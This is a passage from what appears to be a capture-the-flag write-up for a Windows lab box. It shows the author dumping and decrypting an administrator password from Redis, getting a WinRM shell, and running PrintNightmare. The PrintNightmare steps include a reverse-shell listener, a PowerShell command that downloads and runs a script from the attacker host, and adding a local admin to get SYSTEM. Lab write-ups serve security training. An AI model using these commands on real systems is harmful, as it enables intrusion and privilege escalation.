...[snip]...

```

The first line has the password.

Now with that password, I can access Redis:

```

oxdf@parrot$ redis-cli -h 10.10.10.237
10.10.10.237:6379> auth kidvscat_yes_kidvscat
OK
10.10.10.237:6379> keys *
1) "pk:ids:MetaDataClass"
2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:ids:User"

```

The third key there has the administrator’s information, including the encrypted password:

```
10.10.10.237:6379> get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"

```

### Decrypt Password

#### CyberChef

The script shows the key and IV for the DES decryption. [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)DES_Decrypt(%7B'option':'Latin1','string':'7ly6UznJ'%7D,%7B'option':'Latin1','string':'XuVUm5fR'%7D,'CBC','Raw','Raw')&input=T2RoN04zTDlhVlE4L3NyZFpnRzJoSVIwU1NKb0pLR2k) will take care of this very quickly:

![image-20210416095920623](https://0xdfimages.gitlab.io/img/image-20210416095920623.png)

#### Python

Alternatively, it’s not a big jump to modify the Python script from the exploit to something like:

```

#!/usr/bin/env python3

import base64
from des import * #python3 -m pip install des
import sys

try:
        path = sys.argv[1]
except:
        exit("Supply base64-encoded encrypted password as argv1")

def decrypt(hash):
        hash = base64.b64decode(hash.encode('utf-8'))
        key = DesKey(b"7ly6UznJ")
        return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

print(f'Decrypted Password: {decrypt(sys.argv[1])}')

```

It no longer needs the JSON parsing, just take the encpryted password and decrypt it (I renamed the `decode` function to `decrypt`, but didn’t change anything else about it). It works:

```

oxdf@parrot$ python3 decrypt.py "Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"
Decrypted Password: kidvscat_admin_@123

```

### WinRM

With this password associated with the administrator username, my first thought is to see if it can be used for WinRM. [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) says yes:

```

oxdf@parrot$ crackmapexec winrm 10.10.10.237 -u administrator -p 'kidvscat_admin_@123'
WINRM       10.10.10.237    5985   NONE             [*] None (name:10.10.10.237) (domain:None)
WINRM       10.10.10.237    5985   NONE             [*] http://10.10.10.237:5985/wsman
WINRM       10.10.10.237    5985   NONE             [+] None\administrator:kidvscat_admin_@123 (Pwn3d!)

```

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) works to get a shell:

```

oxdf@parrot$ evil-winrm -i 10.10.10.237 -u administrator -p 'kidvscat_admin_@123'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
0e7896dd************************

```

## Beyond Root - PrintNightmare

Atom is vulnerable to CVE-2021-34527, or PrintNightmare. I show various POCs in [this post](/2021/07/08/playing-with-printnightmare.html), but I can show it quickly here as well.

I’ll catch the shell as jason from the Electron exploit, and switch to PowerShell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.237] 54371
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
atom\jason

C:\WINDOWS\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> 

```

I’ll start a webserver in the [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675) directory on my host:

```

oxdf@parrot$ ls
CVE-2021-1675.ps1  nightmare-dll  README.md
oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

If I try to upload a copy and load it, Windows blocks that:

```

PS C:\programdata> wget 10.10.14.7/CVE-2021-1675.ps1 -outfile ./in.ps1
PS C:\programdata> ls in.ps1

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/9/2021   9:36 AM         178561 in.ps1
PS C:\programdata> Import-Module .\in.ps1
Import-Module : File C:\programdata\in.ps1 cannot be loaded because running scripts is disabled on this system. For 
more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module .\in.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand

```

However, I can just `Invoke-Expression` (or `iex`) the code. I can do so right from the webserver:

```

PS C:\programdata> iex(new-object net.webclient).downloadstring('http://10.10.14.7/CVE-2021-1675.ps1')

```

Or from the local copy:

```

PS C:\programdata> iex(cat in.ps1 -raw)

```

Either way, the code is now loaded. Now I can run it to add a user:

```

PS C:\programdata> Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
[+] created payload at C:\Users\jason\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\mxdwdrv.dll"
[+] added user 0xdf as local administrator
[+] deleting payload from C:\Users\jason\AppData\Local\Temp\nightmare.dll

```

With admin priv, I can PSExec to get remote execution as SYSTEM:

```

oxdf@parrot$ psexec.py 0xdf:0xdf0xdf@10.10.10.237 cmd.exe
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.237.....
[*] Found writable share ADMIN$
[*] Uploading file oxypGsJo.exe
[*] Opening SVCManager on 10.10.10.237.....
[*] Creating service WIad on 10.10.10.237.....
[*] Starting service WIad.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system

```